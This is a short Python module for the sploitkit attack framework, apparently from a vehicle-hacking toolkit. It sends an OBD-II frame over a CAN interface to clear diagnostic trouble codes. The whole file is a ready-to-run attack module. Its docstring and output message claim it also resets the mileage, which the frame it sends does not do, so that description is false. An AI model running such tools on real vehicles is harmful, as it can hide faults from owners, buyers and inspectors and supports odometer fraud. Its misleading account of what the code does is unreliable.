from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class reset_mileage(Module):
    """ This module clears diagnostic trouble codes and resets the mileage.

    Author:  shipcod3
    Credits: Eric Evenchick (pyvit module and example) 
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
        Option(
            'ARBID',
            "Arbitration ID (Default: 0x7DF)",
            True,
        ): 0x7DF,
    })

    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Clearing diagnostic trouble codes and resetting the mileage")
        frame = can.Frame(self.config.option('ARBID').value)
        frame.data = [1, 4, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55]
        dev.send(frame)
        pass
